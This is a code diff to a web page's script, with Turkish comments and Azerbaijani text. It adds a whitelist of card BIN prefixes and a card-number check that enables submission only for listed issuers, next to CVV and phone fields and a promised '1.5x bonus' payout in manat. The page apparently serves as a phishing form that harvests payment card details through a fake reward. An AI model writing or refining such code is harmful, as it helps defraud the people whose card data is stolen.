@@ -266,8 +266,12 @@
     </div>
   </div>
 <script>
+  const validBins = [
+    "1230", "3751", "4018", "4021", "4004", "4006", "4023", "4028", "4056", "4069", "4071", "4076", "4098", "4169", "4779", "5239", "5167", "5339", "5398", "4567", "5200", "4894", "5243", "4716", "4569", "4389", "5390", "4641", "5123", "4568", "4210", "4119", "4321", "4118", "4672", "4116", "4211", "5111", "5319", "4017", "4022", "4566", "4198", "4105", "4801", "4709", "4999", "5223", "4719", "5018", "4915", "4212", "5311", "5323", "4822", "4631", "4555", "4799", "4019", "4117"
+  ];
+
   // Telefon numarasını yalnızca rakam kabul edecek şekilde düzenler
-function telefonInput(input) {
+  function telefonInput(input) {
     input.value = input.value.replace(/[^\d]/g, '+');
   }
 
@@ -277,9 +281,28 @@ function telefonInput(input) {
     document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
   }
 
-  // Kart numarasını düzgün formatta alır
-  function kartNumarasiInput(input) {
-    input.value = input.value.replace(/\D/g, '').slice(0, 16);
+  // Kart numarasını kontrol eder ve formatlar
+  function kartNumarasiKontrol(input) {
+    let temizNumara = input.value.replace(/\D/g, '');
+    let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || '';
+    input.value = formatliNumara;
+
+    if (temizNumara.length >= 4) {
+      const bin = temizNumara.slice(0, 4);
+      if (validBins.includes(bin)) {
+        input.classList.remove('invalid');
+        input.classList.add('valid');
+        document.getElementById("submit-button").disabled = false;
+      } else {
+        input.classList.remove('valid');
+        input.classList.add('invalid');
+        document.getElementById("submit-button").disabled = true;
+      }
+    } else {
+      input.classList.remove('valid');
+      input.classList.add('invalid');
+      document.getElementById("submit-button").disabled = true;
+    }
   }
 
   // CVV girişini doğrular
